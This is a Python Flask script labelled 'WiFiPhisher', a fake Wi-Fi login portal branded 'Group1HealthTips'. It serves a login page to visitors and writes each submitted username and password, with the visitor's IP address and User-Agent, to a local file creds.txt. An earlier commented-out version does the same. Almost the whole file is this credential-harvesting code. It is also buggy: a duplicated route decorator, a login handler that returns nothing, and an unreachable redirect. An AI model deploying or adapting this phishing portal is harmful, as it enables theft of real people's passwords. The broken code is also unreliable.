"""
Group1HealthTips WiFiPhisher - Advanced Fake WiFi Login Portal
(Flask Version)
"""

import os
from datetime import datetime
#from flask import Flask, render_template, request, redirect, url_for
#
#app = Flask(__name__)
#
#@app.route('/')
#def index():
#    return render_template('login.html')
#
#@app.route('/login', methods=['POST'])
#def login():
#    username = request.form['username']
#    password = request.form['password']
#    # Write credentials to an external text file
#    with open('users.txt', 'a') as f:
#        f.write(f"{username},{password}\n")  # CSV format: username,password
#    return redirect(url_for('welcome'))
#
#@app.route('/welcome')
#def welcome():
#    return render_template('welcome.html')
#
#if __name__ == '__main__':
#    app.run(debug=True)
    
    
from flask import Flask, render_template, request, redirect, url_for, Response
app = Flask(__name__)
LOG_FILE = "creds.txt"


@app.route('/')
def index():
    """Render the fake Wi-Fi login page."""
    return render_template('login.html')


@app.route('/login', methods=['POST'])
@app.route('/login', methods=['POST'])
def login():
    """Capture credentials and log metadata, then show success page."""
    username = request.form.get('username')
    password = request.form.get('password')
    #email = request.form.get('email')
    #phone = request.form.get('phone Number')
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    #print(f"Received login attempt from IP: {ip}, User-Agent: {ua}")
    #print(f"Username: {username}, Password: {password}, IP: {ip}, User-Agent: {ua}")
    with open("creds.txt", 'a', encoding='utf-8') as f:
        f.write("=== Group1HealthTips physh===\n")
        f.write(f"[{datetime.now()}] IP: {ip} | UA: {ua}\n")
        f.write(f"Username: {username} | Password: {password}\n\n")
        
@app.route('/welcome')
def welcome():
    return render_template('welcome.html')
                            


    return redirect("welcome.html")


if __name__ == '__main__':
    if not os.path.exists(LOG_FILE):
        open(LOG_FILE, 'w', encoding='utf-8').close()
    app.run(host='0.0.0.0', port=8000)